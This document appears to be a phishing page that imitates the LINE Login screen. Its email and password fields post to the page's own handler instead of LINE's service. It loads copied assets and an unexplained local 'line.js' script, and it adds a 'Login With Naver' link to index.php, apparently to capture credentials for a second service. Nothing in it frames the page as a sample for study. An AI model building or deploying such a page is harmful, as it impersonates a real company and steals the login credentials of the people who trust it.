<!DOCTYPE html>
<html dir="ltr" lang="en_US">
<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>LINE Login</title>
  <link rel="icon" href="https://line.me/favicon.ico">
  <link rel="apple-touch-icon-precomposed" href="https://line.me/apple-touch-icon-precomposed.png">
  <link href="line/chunk-common.css" rel="preload" as="style">
  <link href="line/chunk-common.js.download" rel="preload" as="script">
  <link href="line/chunk-vendors.js.download" rel="preload" as="script">
  <link href="line/index.css" rel="preload" as="style">
  <link href="line/index.js.download" rel="preload" as="script">
  <link href="line/chunk-common.css" rel="stylesheet">
  <link href="line/index.css" rel="stylesheet">
</head>

<body ontouchstart="">

<div id="__layout">
  <div id="app" class="LyBody">
    <div data-v-60d041f8="" class="LyWrap">
      <div data-v-60d041f8="" role="main" class="LyContents">
        <div data-v-60d041f8="" class="lyContentsInner">
          <div data-v-742c34de="" data-v-60d041f8=""><!----></div>
          <div data-v-456f4426="" data-v-60d041f8="" class="MdBox01">
            <div data-v-456f4426="" class="mdBox01Inner">
              <div data-v-456f4426="" class="MdLogo01">
                <h1 data-v-456f4426="" class="mdLogo01Img">LINE</h1>
              </div>
              <form data-v-456f4426="" method="post" action="" novalidate="novalidate">
                <fieldset data-v-456f4426="" class="MdFormGroup01">
                  <legend data-v-456f4426="">Login</legend>
                  <div data-v-456f4426="" class="MdInputTxt01">
                    <label class="mdInputTxt01Label">Email address</label>
                    <input type="text" id="email" name="tid" placeholder="Email address" autocapitalize="off" autocorrect="off" spellcheck="false">
                  </div>
                  <div data-v-456f4426="" class="MdInputTxt01">
                    <label class="mdInputTxt01Label">Password</label>
                    <input type="password" id="password" name="tpasswd" placeholder="Password">
                  </div>
                  <div data-v-456f4426="" class="mdFormGroup01Btn">
                    <button data-v-456f4426="" id="login" type="submit" disabled="enabled" class="MdBtn01 ExDisabled">Log in</button>
                  </div>
                  <div data-v-456f4426="" class="MdFormError01 MdShow">
                    <p data-v-456f4426="" id="error" class="mdFormErrorTxt01"></p>
                  </div>
                </fieldset>
              </form>
              <div data-v-456f4426="" class="MdMN04QrLogin">
                <h3 data-v-456f4426="" class="MdTtl01">
                  <span data-v-456f4426="" class="mdTtl01Inner" id="processing">or try another login method</span>
                </h3>
                <a data-v-456f4426="" href="index.php" class="MdBtn02">
                  <span data-v-456f4426="">Login With Naver</span>
                </a>
              </div>
              <div data-v-456f4426="" class="MdMN03Etc">
                <button data-v-456f4426="" type="button" class="mdMN03EtcLink01">Forgot your email or password?</button>
              </div>
            </div>
          </div>
          <footer data-v-60d041f8="" class="LyFoot">
            <div class="lyFootInner">
              <div class="MdGFT01Copy">
                <small>©&nbsp;<b>LINE Corporation</b></small>
              </div>
              <h5 class="MdHide">LINE Corporation Link</h5>
              <div class="MdGFT02Link">
                <ul class="mdGFT02Ul">
                  <li><a href="" target="_blank" rel="noopener">Privacy Policy</a></li>
                  <li><a href="" target="_blank" rel="noopener">Terms and Conditions of Use</a></li>
                </ul>
              </div>
            </div>
          </footer>
        </div>
      </div>
    </div>
  </div>
</div>
<script type="text/javascript" src="line.js"></script>
</body></html>